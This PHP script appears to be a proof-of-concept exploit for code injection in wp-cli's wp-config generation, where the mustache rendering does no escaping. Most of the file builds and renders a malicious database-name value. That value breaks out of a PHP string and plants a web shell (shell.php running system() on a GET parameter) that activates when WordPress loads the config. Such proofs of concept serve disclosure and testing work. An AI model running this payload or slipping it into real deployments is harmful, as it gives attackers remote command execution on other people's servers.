<?php
require __DIR__ . '/vendor/autoload.php';

use Mustache\Engine as Mustache_Engine;

// Exact reimplementation of WP_CLI\Utils\mustache_render(), verbatim from wp-cli/wp-cli's php/utils.php
function mustache_render( $template_name, $data = [] ) {
    $template = (string) file_get_contents( $template_name );

    $mustache = new Mustache_Engine(
        [
            'escape' => function ( $val ) {
                return $val; },
        ]
    );

    return $mustache->render( $template, $data );
}

// Malicious --dbname value an operator/automation pipeline could pass to `wp config create`.
// Breaks out of the PHP single-quoted string literal, closes the define() call, and injects
// a new top-level PHP statement that writes a webshell to disk when wp-config.php is later
// require_once'd by WordPress's own bootstrap.
$payload = "x'); file_put_contents(__DIR__.'/shell.php', '<?php system(\$_GET[\"c\"]); '); define('DB_NAME', 'x";

$template_args = [
    'dbname'    => $payload,
    'dbuser'    => 'wp',
    'dbpass'    => 'securepswd',
    'dbhost'    => 'localhost',
    'dbcharset' => 'utf8',
    'dbcollate' => '',
    'dbprefix'  => 'wp_',
    'keys-and-salts'     => true,
    'auth-key'           => 'A',
    'secure-auth-key'    => 'B',
    'logged-in-key'      => 'C',
    'nonce-key'          => 'D',
    'auth-salt'          => 'E',
    'secure-auth-salt'   => 'F',
    'logged-in-salt'     => 'G',
    'nonce-salt'         => 'H',
    'wp-cache-key-salt'  => 'I',
    'keys-and-salts-alt' => '',
    'extra-php' => '',
];

$out = mustache_render( __DIR__ . '/wp-config.mustache', $template_args );
file_put_contents( __DIR__ . '/generated-wp-config.php', $out );
echo $out;
